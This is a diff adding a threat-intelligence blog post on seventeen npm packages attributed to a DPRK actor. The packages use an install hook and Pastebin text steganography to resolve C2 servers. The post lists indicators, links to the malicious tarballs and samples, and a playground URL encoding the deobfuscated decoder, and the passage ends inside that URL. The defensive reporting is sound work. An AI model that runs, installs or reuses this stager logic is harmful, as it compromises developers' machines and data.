@@ -1,0 +1,292 @@
+---
+title: Novel DPRK stager using Pastebin and text steganography
+description: Seventeen npm packages released in 2 days use a mischievous stager mechanism
+date: 2026-02-26
+tags:
+ - javascript
+ - malware
+ - npm
+ - dprk
+---
+import Summary from "~/components/Summary.astro";
+import Fig from "~/components/Fig.astro";
+import Callout from "~/components/Callout.astro";
+
+import Paste from "./images/benign-paste-or-is-it.png";
+import TSPlay from "./images/running-malware-totally-safe.png";
+
+This is a quick one as FAMOUS CHOLLIMA has been keeping me busy
+this week by [testing Google Drive as a stager](/blog/dprk-gdrive-stager) and my longer write-up on 
+[tracking their IP addresses through temporary mailboxes](/blog/dprk-opsec-3). 
+I just cannot help writing about this one as it's really fun -- it also 
+helps that having a sleeping baby strapped to the chest for three hours 
+makes for idle hands, and you know what they say about idle hands!
+
+<Summary>
+* Seventeen recent npm malware packages use Pastebin and a custom text steganography 
+component as a dead-drop resolver
+* This signals further recent and rapid testing and development by FAMOUS CHOLLIMA
+* This post contains tactical IOCs and brief hunting guidelines
+</Summary>
+
+From 25-26 February 2026 my continuous scanner that supports [my DPRK tracking on npm](https://dprk-research.kmsec.uk/) 
+identified seventeen new packages that contained novel loader logic.
+
+All seventeen packages contain an identical malicious JavaScript file at 
+`vendor/scrypt-js/version.js`.
+
+sha256 `da1775d0fbe99fbc35b6f0b4a3a3cb84da3ca1b2c1bbac0842317f6f804e30a4` [view raw 
+sample](https://dprk-research.kmsec.uk/api/samples/da1775d0fbe99fbc35b6f0b4a3a3cb84da3ca1b2c1bbac0842317f6f804e30a4) -- it's highly obfuscated, my analysis is further below.
+
+
+| Date | Package | npm user |
+|:-----|:--------|:---------|
+| 2026-02-26 10:35:55 | daytonjs v1.11.20 ([download](https://dprk-research.kmsec.uk/api/tarfiles/daytonjs/1.11.20)) | christopher.smith.hal47 (christopher.smith.hal47[@]gmail.com) |
+| 2026-02-26 10:33:00 | corstoken v2.14.7 ([download](https://dprk-research.kmsec.uk/api/tarfiles/corstoken/2.14.7)) | christopher.smith.hj47 (christopher.smith.hj47[@]gmail.com) |
+| 2026-02-26 10:28:26 | jsnwebapptoken v8.40.2 ([download](https://dprk-research.kmsec.uk/api/tarfiles/jsnwebapptoken/8.40.2)) | christopher.smith.ye47 (christopher.smith.ye47[@]gmail.com) |
+| 2026-02-26 10:25:49 | iosysredis v5.13.2 ([download](https://dprk-research.kmsec.uk/api/tarfiles/iosysredis/5.13.2)) | christopher.smith471014 (christopher.smith471014[@]gmail.com) |
+| 2026-02-26 10:16:52 | sequelization v6.40.2 ([download](https://dprk-research.kmsec.uk/api/tarfiles/sequelization/6.40.2)) | hello.mr.jr29 (hello.mr.jr29[@]gmail.com) |
+| 2026-02-26 10:09:45 | undicy-lint v7.23.1 ([download](https://dprk-research.kmsec.uk/api/tarfiles/undicy-lint/7.23.1)) | patrick.sullivan1896 (patrick.sullivan1896[@]gmail.com) |
+| 2026-02-26 10:05:58 | expressjs-lint v5.3.2 ([download](https://dprk-research.kmsec.uk/api/tarfiles/expressjs-lint/5.3.2)) | veryanthony00 (veryanthony00[@]gmail.com) |
+| 2026-02-25 22:31:13 | loadash-lint v4.17.24 ([download](https://dprk-research.kmsec.uk/api/tarfiles/loadash-lint/4.17.24)) | charles.cm.morgan (charles.cm.morgan[@]gmail.com) |
+| 2026-02-25 22:26:36 | promanage v6.0.21 ([download](https://dprk-research.kmsec.uk/api/tarfiles/promanage/6.0.21)) | andrew.ddn.walker (andrew.ddn.walker[@]gmail.com) |
+| 2026-02-25 22:21:37 | vitetest-lint v4.1.21 ([download](https://dprk-research.kmsec.uk/api/tarfiles/vitetest-lint/4.1.21)) | andrew.dea.walker00 (andrew.dea.walker00[@]gmail.com) |
+| 2026-02-25 22:13:14 | prism-lint v7.4.2 ([download](https://dprk-research.kmsec.uk/api/tarfiles/prism-lint/7.4.2)) | stefan.matic.topdev00 (stefan.matic.topdev00[@]gmail.com) |
+| 2026-02-25 22:07:50 | fastify-lint v5.8.0 ([download](https://dprk-research.kmsec.uk/api/tarfiles/fastify-lint/5.8.0)) | andrew.dn.walker00 (andrew.dn.walker00[@]gmail.com) |
+| 2026-02-25 22:03:16 | typoriem v0.4.17 ([download](https://dprk-research.kmsec.uk/api/tarfiles/typoriem/0.4.17)) | andrew.d.walker00 (andrew.d.walker00[@]gmail.com) |
+| 2026-02-25 21:51:56 | argonist v0.41.0 ([download](https://dprk-research.kmsec.uk/api/tarfiles/argonist/0.41.0)) | andrew.dean.walker00 (andrew.dean.walker00[@]gmail.com) |
+| 2026-02-25 21:46:19 | uuindex v13.1.0 ([download](https://dprk-research.kmsec.uk/api/tarfiles/uuindex/13.1.0)) | andrewdeanwalker007 (andrewdeanwalker007[@]gmail.com) |
+| 2026-02-25 21:37:45 | bcryptance v6.5.2 ([download](https://dprk-research.kmsec.uk/api/tarfiles/bcryptance/6.5.2)) | needlesstosay (needlesstosay0o0o0[@]gmail.com) |
+| 2026-02-25 19:38:58 | ether-lint v5.9.4 ([download](https://dprk-research.kmsec.uk/api/tarfiles/ether-lint/5.9.4)) | maheshkya (whereisandrew2[@]gmail.com) |
+
+## Analysis
+
+These packages contain an `install` script:  `"node ./scripts/test/install.js"`. 
+The presence of an install script overrides default npm installation behaviour 
+and this command will run upon package installation.
+
+This initial install.js is just a step of misdirection and simply imports 
+and executes the malicious payload at `vendor/scrypt-js/version.js`.
+
+`version.js` contains three hardcoded pastebin references (in the following order):
+
+| Pastebin link | Last edit date | Pastebin user | Views | View my mirror/backup |
+|:--------------|:---------------|:--------------|:------|:----------------------|
+| hxxps://pastebin[.]com/CJ5PrtNk | Wednesday 11th of February 2026 03:47:40 PM CDT | [davidsouza23](https://pastebin.com/u/davidsouza23) | 353 | [CJ5PrtNk](/samples/dprk-paste/CJ5PrtNk) |
+| hxxps://pastebin[.]com/0ec7i68M | Wednesday 11th of February 2026 03:41:28 PM CDT | [Edgar04231](https://pastebin.com/u/Edgar04231) | 15 |  [0ec7i68M](/samples/dprk-paste/0ec7i68M) |
+| hxxps://pastebin[.]com/DjDCxcsT | Wednesday 11th of February 2026 03:43:37 PM CDT | [Edgar04231](https://pastebin.com/u/Edgar04231) | 19 |  [DjDCxcsT](/samples/dprk-paste/DjDCxcsT) |
+
+There is a loop to fetch and decode these payloads, however if the paste is 
+formatted correctly (more on this below), the loop will break and no further URLs are processed. 
+Effectively the second two act as fallbacks, explaining the discrepancy between
+"views" in the table above.
+
+<Callout type="comment">
+It is highly likely that a large portion of the "views" of paste CJ5PrtNk represents 
+victims that have run this flavour of malware.
+</Callout>
+
+These pastes are ostensibly benign at first view, however there are minor 
+inexplicable typos in the text:
+
+<Fig src={Paste} caption="One of the pastes viewed on Pastebin. Looks benign to me!" />
+
+
+After fetching the raw Pastebin content, **the malware uses a custom decoder 
+to extract specific characters from the text into an array of C2 URLs.**
+
+As the original implementation is obfuscated, I asked Gemini
+to rename variables, add type annotations, and comment on functionality. 
+The result is [available to view on Typescript Play, where you can safely run it yourself to
+see the decoded C2 addresses](https://www.typescriptlang.org/play/?#code/PQKhFgCgAIWhhA9gOwGYEsDmBXATgQwBd0VpVFdpCALAU2loA9CCBjY0gB10VdoGd+UWMCisU-QtAAKAQQCaAGQDysgCIB9NQFFFASQCyegCraASgC5ok3OmSZoAXmgAiAD4eXAbjESpcpVVNbQA5TQNZMwBpcysbOwdnF0cU0LUUx29fZEloAAltdXMNAGU9AC1tK2RsAFsAI1pKZwBWH0goUAgYODNafAATfio6MnRcXJboVmp8NkIm4cRUEfoF5ipEaAHaBdxau3phOGpEAHdoWvxkAE9p2fnF6Dn6anQBneRoM-QaO1Xtrw6rRkIQAHTHUSQVDYZDsEhfTC7PLvT5qIj4RQgzA0AAU60IcRYCQAlNU6o1KABvYTTPzQAA22JoeX6O2aVCY4P42Hq8XsuIADAAafKFHRmUoVbQk9rQaC4XZ4L6cOb8Wh6UG4pn2FlspqigCMgtlUAAvlBOmBjgh8AzWNgGUQBAD+JxaKx0BhWNA7AN0HxhrjOIh+L8EfwSd86IqAW8PiDoDaZnN8Owni9GbxnQNoPV8Orc6QaGtEIQ7dBVTcGYhBozmdQIT0oTC4Rwvqw7Q6nQtpPhq7WBtJQ+GJMH+zXBljddRyQ0DZtywzjFzpzjZ9AavPcGTNxSmgBtAC60BpMDpOSkIbD7f4c8px6c0GP7VpwGA0GMowwEykU2vo45M8sZ2mc-bDCW0B0IMTS+oQ6oMqgtLkJQ2q7L6T6Cl4GEADxikUkplJU2HoAA1KRUZnvK8oAbeYKcNg-DULi6CmueFodOe4iXtAyyoOqUjOAUBFSsRtLcbk+AAG74OgTr1EyJSqnwT6EGWdorswa40NAAC0vGoPxuxykm57vtAajoPE9TYAsAJVpOuYpo8EwMFJIIMncaY8IIAKKlcdgJJyzDifSdh7DJDJPgYRCNqgNYULi0myfJinKfQH7jgOU4NtApHQIaJJschFDQGhUgAFaYdhVV4Q5g7adQNXkZRtLyuZ8Bdo6zoAhVdScHEADW6CcHG+q4KKJZfLUiDuXmdzhU0kVCOe8oSVeoZPnxAl5WVVVwItuCRVG+UxTQYLxYgiWHZF0AfgATGx1GViOdEMUxwahk90AcbSiqEMqL03hG7S-ZAXQ2tozDzBBowEBc8afNYxL2GQPC1AC4juZQBKQlArbwqQXLzCiCbICUKOYLi8OaYSyO2PYu78g4VH1lITDuumAyNfesHOFhtK0iwdys-KHMegs3O5c4SKEKTaIYo11P4GctPfWa0xEDMZVNDup5tQqSq4F8LjeHdH4AGIpbQuZqYbdbQeytJg2t9K0RGT6dva3W9hOg7DsDY7i1zjWijTXJgjq67fUy7PQ2mkvwA8wxJFknHtR+FNzFIqDowCfpMM8qB7GNMGoQXjDQFMKBgbgQwkiVqGx9Ag1PsJEqido2Gt3Vr0RpHDbdy1+urReuTOZqOyV847sSAeg1HiZ8pemVE-IFP0B4eHzADzOrWj2L8dc0nap5c42+EAea9T4vBscfKLuGwDxsMEfifJ6Dlrg9aPTQEpDK-FhvQYmCcbb0yCuFLYfp0BSXeNgCs8B7rQAAKpmEUCtEQ+NYSExVGqWgiDkG4AZPwZWZw+zZQGESBmmAmaU0fKzcyfQZpzUgiCXMVxcCDVgtcXMtBsY3D+KjfAxdYK-FCjxVgTJrjkMck+eGMjBxgjdAAwguIAgqHUBoNIGgIjRHMCSA8gpb7njfJnTgKj5oAh2AAg4JceFjAZCXRAtkGC1E4IQO4zMMFP0BpI-oyAFGDANko8xvw1EKA0ZoHQ+gjCmDMA3UeF05J7FxLiPADIqGkicAAPmgOksExJai4hJLvdc0Bckmk-pxCGv8Yr-BBMLF64UyClUgjscQTtmxYLbAibYHpEA7EQYEgYuJED1BhPwTsktaaZMZrMzA9DxG5ERiCdE5YnwgPYPLEEFNqGjPGYxKZNs1YmX+oDVUEx8H3UIcQ3EKzkBrPwGxMG5lc6IAxtQQghBOB3nfKqSQtB6h2DBOIWowB4bAHgAAKRaNIXAhAQiDWyLkae0AADkgpBQAE4ADs90AA6uB8XIEJcSpAbjsC0FgiUT0IIVI8MYHCxAmACC1AOPYKwshCDku4LQOgOQYH0F0tgd4tBSUkqJcgHltkmisEmegOl9ArLPGgFJagkl15uSaLpPhtAGSwNRhgPVttqDsAYHCd5-z1TDEGqMSQ2ABh3GWHSAYDE9j8FFKCt1gEKz8BuAC2o-Avj2MgiWCgBSAwVnILCAYRAYFARoEQPJ68mjummgMpoXwFgzGQEQ5lNwwTQC5XBYYrBWCKk9ZamVlB1QKrhEq4Y+B6jOMIMQxA+qgrcDGUyJReSwyoy9bZONKAKyCOGsgUa9idjuRrJwOwo1aCGQDHWqQdpMBuFsDQQNmxKw8FYG4XydgUJXHbG4GQPAWX4DZQkT1bxtbKsgtwe0xAvbPE4KEzstBenOsHQsKS1haX1t3XYPg5iBCijsFJdt7l+C4DOJuoKHSG2qrmCQRiu7mXwuvajJ09h4FInwDu8t-Q7L8GWKwWutBRT4HfQAqZg0JDUc1X6gFulYZJpDGcWCiBYL+kwL8CsZwKAMkYGCcV4rNQjGVaClgfKQRhjmjgd4ABmUUXH8VooZFFDmNZcCChQ7YZxja3QekNEsFYv7YIgrrfSzVXapKsvZZgUUbyMa0BjVehpFZuKKncRBLYgwZJwlYLbRAc65WFoAOpis0-QLGsEu2XtqAAnD1wcD4CRB6sEa6KC-GoNunhgwMT02wOwPAtBOCijI8XSj5rMCcGQFS6hu6E7oDcOB6w-qFgYx2PwNwmBkCiljeWfM1rhRuEa4QITnCb2XDTG8Rr9Y5jIBvQyLj9Q+kzrC7UEEVHeLugIMQVGfqpLdY9c8TVrAbiNAEB6PAvwC3iclUy3AjmgqKDS-A61T3iVMqS+yqQuH0uZeAiR0Yal23DC43klSdtQW1FhJGrhvpLy4FK7eXScOq3usLfgGM9BMzUBjbgTgQwDIYf+w1hwQP8MdaxfN74eWS28SxV8P1oJ8CMCq7QK4AAOF9537GMXoNl61haSjvPoM6tV9AZq5BDAxJ09BEtvZw8bYHLoQMMgdawCwP3kCGkLdIARpxkBWBBOcL4KFmf8AZG4ujD2Lu5lwNl2NQKVE3FFMb8spBlU-GsXcbA7pcz-GG4R+VDW+CiiuDMQ4jI3DLdm+tvp7XZ07dBEx3MbhbLvOHcgQteh4KNGYPJwVjJ0D1Fe7YF09jc6eZIJw4YVxke-GeJgbG-A41MnuIgdA35SoyUM+h75H68-8DE5K8VDJC1QuSjS2w7irCoY4XJQPhY8mlWT9OvVYXGsZ+gLPmS8+Ro+hBE2pkwxDqmuIHNKdNxkD4F0gGb4gLKwZYEIWr9OlIKBYaYwZ1IQGaYIFU52s+5Yx+7imsXwyAiAOKeY9AwuuY1u-AAALEdNqmGDsJtrQPdNtg0s8FDnqtPvrspjPslJygqFJDZJIKKGMhVBLLpDxiumAjThlpQIgSjuansOWlZATrRpGsQPJqKLIOvDwO8G+lFNvmng0qKGCJqk6LgEiGxl7P0CxmdmQTJBpqNC4PBr8FLvWqKAxMGrcGcPji4JWG4HJKGGFtQHcM3gIJYVIG8JgNQJ5C9PCm4ApLQBPsSuKigYWvAORFYBtpxk0DCFFEDgQEiH2mAv8H6noRjCrlek5qKJgJ5tgbOvyoQJnlBFgNQJjmERQFcEBjRqPnRAgOREXKgE8DWGcLpEyO5NgBeCwO2k7lBPYNQAwEuoBldiCuKi0AEQAMRWBqC6o1h0C5j1B3AGABg+TLC6SijwCDG+jDAcHoCEaRZ+jnCNr8GqjtgZHbYNbZHQBpE7YZEABsnA6eUgPwOkyCK2honubRDSqauALQ6o1gywU2LwPhEqxKYI4uPwxcnKtGfCwwSR2GDg-iGuLSlA6AygE0c2rAygJQamWspqqJbRhAUkKJb69AUheBoIhaa2XoUgyqvWWA+eoW8B1gwie2+ABYxx9iHMvmCm3h+uOKhaAA4ogFYO6FtsHpYjyf1kyKKDySsS3DARNrCTbugG4pYZ6B4pWnCHgCTnCJ4kHiGPCtRnXF0d6DZgtOgHmCKgyP6Mdl7A0N3pNtNq3OqHwgGB-vrtoAzpwFBv9kFEDv0NEbMJfvBMjHwDOI2pqlxkQI1oIB1iGqcD3g6eTrhmju-gZAsF8DsJwLpOvEsFmnau6F+t6IbAAI4ir+RcjmYqpdr0HsCTTg5zCyyVgoFEDHo5E0C86vwHbEAfHOrKajAElXENIFL9C1C-HiqyAMiYC5bYkFaaqPJ-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-tTpy-uQHqGw8iOISMq3EoDEMglB3abq7MK9S6qEaPlhcKIia88AdcqrxHdZowY+wj4C2TiC2CPMrtlq9vCiD3FbDXzbgbrGaplgxjqUOhf7-3UCo3wSu3T7QAGADLdRD9WACe-mlM6oYwFgqrPOG2ySkDOoFw00aaY4odAFYuc5KM0fchfmgDnEa6UBGktOl5yzobYQ7AFAMGFCGh7EXTcsIcDI7qgLkzoTyK7RxT-oZi5aUMEtAdIbVY8w3RUFYBfgn0huEsW3ttw8Td4bmyMdzNgwuzHM6MeeAgt-0jiG19izqScAhDuDiAg8ybQwimjTSfBwK2wWjIgBuA0V1KR0NrAex77IBecARGsA6mgBuBscCQUngYNb5NAVe-PFfgY0VBkY8AfAKQLiA4Yd4qsakJ0EiCGwYhRsAgQjLsFYBggows0WCDQG4r0ddgEHB-GdyChldVBKAJyKGEIA6pDIEsAYHNDY50RxUtAbQEkI3q0UusukLGn13zIioqUjaPpBVmTRTwZG68IKIzU+QYZrygIAKFikrIE4PeqUKYNmhBqg9kWwoHFJGTWAEAdgukC6PxFG7FMQ8-6f0EkK1ZSBesJFC9jd37gBNHkXgv+PVzlT64VhBYGvNlQoCfl0AG-OkEnwB7k5Y02WaDqui0znAyAcwPUsY21aSBuq7gp+NXhkiVY2ixREaN1A+ZfAABaAMXj8MLTmcvIsYA9OqB1qEVKAxRLyPwSmQIhjirmawFcC0xsYnQ3eI1uwAgiEYFC0RF4iTgmAfE1CQzOHotlGYXhQM8EXvFLRGzbDOsAwdltjz4oZC1a0vc8lFF0ieDth6DDEAySu4cDJAFAUaA+X+AjYmQo0WVruhtiLo7A90NDj2AjBvBOA+mRoFNipSZkecYIFAlDCvQpMUckibAGCHoAGAbgJQAAIqKAvc8Q9vLQDNEWi1ObAKlJL0LSAEx6l1ThiOiii4hACtokkCFk5HWoRizoLwexikACju8woq3EUTKq8QSwOMP1sBEGA+oooI2d0CJy-oCCuEqZGhsrlkjKsDBQIOOrQUoDroaM6qQtNqPtwOFGRRouLogDUDnZOoggHhAQGoziEQgtARACgQqjZ1KOOIJtLSJgJZ8UseeEwSc17bvlFC1wA4cjwcARiKq9QGkR8U26BRZIjzQ2HzVjTqlO8KjCrGwlL5ipt6u9SeEwGMG6R4A1-IKEBTm7j8a6PzAXoENdDuIwEzqB8v9GUwKpboUfQ7CQHOLd8-iyARBsYAIA5A0wVrCQJyjUgHAfQBowBOTg540BTs5qHkLGCAoSAzepfJ3AzCLZD9OCaYMPF4PI6f5KUO7dxHKQOFEAawZuT8B6BBroAwa4+BylAnvFHNH0mfYou6FOH+jlcxE5FsQMo7vN+xHxQYOyjN4J52wJg8sH1m4pQZxhaPVVvxmm7sJCuOAqbmJQrqYAvBilfUWaS+D5gjaQeFeljDmAAtmMg-VfK7SThXRhehARoAqDyKzDORWVavg1ynSCBKSv5L4MBS8r4F8J2w5QnQCuAvktGskSEcaTkj+hOADgZwvkS15FFI8fBaJogF5x-jxU7YqbM9QSB1lJyZvWwDZAWBTASg63ectvTSlnBLy6NNokL2xIV4ZUuYIkYGi-QzdoMQHBOvsERxwjSAPCMtFdDrh2B+BPGS4PTSXoJ17c7qHdPNg-G45+ektE4rWCdAj8QRLUt-EbWbSLZahFWQ6JNmeIJ45KbSMYrXzrZZMvY7zUUjcPpqY520Z+bVqUT4EcAP8cPEZoj0kEUjyqfwC6qjT1G8VceWg6qtAFKnPUMMraZ5tFTMCOga8l2FAOe1vCbAk0o5bGOqOmCMBZ2TrCuq3BVFcZEw06AMGxl4hQ8nqnCegBWN1Fa5GAWBYwPAGkDAA9A0gUUHkGMDGAmSk5EICUCdGGh4AACBpGxiWiwQ7KNA5gXQKLTnFIBeqaMFHSR6GijuRQ4dtYAcywJAwnPDvjxmS6L8MYTg17EsC06EZrS5aQaD2Iz7aoFgukbMqhGkD3RpAUYRrGtmeroMPQDSF3AAkOH4zTKKsfHI-V6yaxJ0ZqL-s2h0isA509tNok4I3QicHgQURUIYLsEuh-QiodgDHUZw6R+g2sE-rmldq71FAg4PMFlWz7GCLIOU9ANgHY6owQM7yBIMbF2DwSCAS6QjN5FDBN4hpYGNQR3h3Q2xkJUuUiciIVDWFI5eSYgA7LTC9J7E0U54INBShe8PcrtFoPpE6hhVMAVgCmG80NSN8GkbhTgFv3DJLU3Kk6G4U3TTAJ8cUNYDqVmi2CKhlMpWegD2AwnXAUCvoZicrkKJghiiEvfXBR1zn8AHMNUlOr5JKGBjFxDfOAZmEMpshOw5A3yAjkcTDSkSC2DrF2gARZdoh7uApFbyQIr9HEqDJkMBKfnb0DO8AcRguz6qRUmqklc9JDWBnZ5LazwWPHwjPRsEqUh0r4GemZbhjisMkylM8Elqzi85eUsBHX0EB8gFZ9U47ugEYA6joBjI-wJzk2j2IzAwiFKZKikaLByw1QwgA4Cdm-k6wVU3KbVOmBFSJS9fQaMQFCk2RwpaZFlsdJK6GwZe5iweUIpilsTs+awWEWPhGAtBBa1wWnvlXPlYpFCBOFnpLOWCyjisQuDhtAEvLCJvQrtGKLHjmhYhE8ik2gLID0D65IlUC+sK9lUltFs4y6AilFEWhaYsAiqMqAkr2qxgiEy7NwiynOBBRWGxqEMS0k7AZlLm86FHAsDyVIgHhPydlp2FVByU3AKwKRMbCChvIz0D5LAWjTayzivKYYO7hQDCy80Aw5REoPsHoBkjuIFIjbCKLeDx1CM1Y5Wv+Px7VpYE6+fpStn4Czyi0VASdijNqCccUlxyhIC7LFk-5+qipfLEtmNjDBc4g0DGPJA0q2wCA6AJ-IBWKybcGSFnG2PMo9gNZNw2NUULCDtK4Jyw5Y4RZWOGDKYFmWBSRJdy9CGhD5bRRUJgEw5uSuAZ1DUU6JQQ5B3uR0ZBiwRCqqTzcFyjic6hjxvBYwdy1GJHVhzAcFGeWc+bSvBJ0cmgxCQOdeJdwfK84sIH5U6A3mIroARMtLp9MWZI9GIB2DyUtTlLg8plD+D3OuNDrtg9ZoxCrG4DZVnLn2PIIyJkxWDMrDgYM2JdTSTThlVyxAfUqG0ay28ooTsrYBKLAViMdQToG4E8Dtj9KoosNQuL5lRpeZoZL4gRL9INWjRjl2IWno2koVacZGhs+YiWF0i6RcGNg+muVSjpf9ROmVS-MIuiIxzmUK2DgMcQfzPwKwQOXnAmR4XMt9Mf5bMtrEVA4py1gEVOYWkNFHoKA4ffAvqltUUFnaVKJlRNMWzGrRZIEDsG0sBx8rNgPONGviUmURgGQyNQ6K1nsBggJRbikELAmqZ1tV2tskaGHOxpzAycgotNHaEEJI1thZ6X3NhxwRuAJ5zoogG6oMGfYG1lnPKg4C9GKBzZpPbAEalNLk4ElIwXIOQAdBXciY6xBSIhnQqbQ7YMaBRZN0Up7BeUTJUDW0tEavA6gbi1gkiHI53BpUJcQ5XWhMEgaiwlAcDRwKg2MQcZRMB-PBqEToVXIdsedK8XQhC5143AKobmEOXwIooKBf4Vn32JvJOakEabKaWIHKZZVfwOVJwQSUWAwQfvU3uyCIBQZfhsTBTRWEW63SPY1wSgCGHN7rEooQKNMPLTSbuQOx17VdDuJraHSVg4G8fAGlkXEpklfUt5ekqL56Baec0LcE0GcSTpHFt4cbIiIOxkYtVGgtDvDjYREBDBQEWvAQH0F5lBmOCcaQXJQDvJ9a7kO9E6CDLsJwVr6FbBlhgJhh3NyAaLAuNGIClri+uSLE2hfb4EGsMkmDNMAvEZYX8fIPQoVtVEbYbpAhEgOqguEKhYQuMvSKME2m7AC8wCC1BdwdV5hmAcrb8DwFBA6oKauISRCujYyiokE9iPSYNB1SaocUTgjAqKj2otBOYDNFYFvn8o747Nwzf9CspQAvTzU3Wl9sbDJLorvpeyn0HTIMBgNcQeQS5fCipRSAYonCYRh9jwwjlaAu4fPoorI66kOEQjONWlgZLRFrcxGONJFI+2qgQc1wcUa-kG1wiJslW92vABKAlB62B6TsFlwpjVh6AbgOgIh1bbIxqweZawKzsBxfqcAOVGUr1k7C-NUYj6GwcgA5wiDVe2wTjsCG1Z-sz8-wAHWA1KgAANQHZwDNYH458PBVUBQQhIA5GQfOoDrFDPxeEQhx9THGXjvwP4Y8+O9-JVs4CFoLYa2hIWwjRg9kbSftCvAQCtbgykCrKbGoaEbyjaww9uFAqgEv4rqBSEsi1fz0JpSRhccJP7qhUs15M5V8tLRlgT6AJxhC9gTFYiXsTANKUwBdkoe0LRSU+Wx2+xnXh2xe6rALuh+djWtmjbVQdnLAuHjm68oZSRi00k0rO24BdtHe2vgZokBIrY6xMn7QYMYDX1x8IBMqIARSHAFIwooNQBVDSxbAWIJuFAPNTaKgy-UE26RXJEq0VMi00gPQEGFkCOLe8pAP7Kri+CFswilmyMC-xT3Gd5ZNzOafXSmGas6Uy3WrF6gTYByscbKbAE-iOTxzOiicqXLGL4nQBosRNMyR4isAGA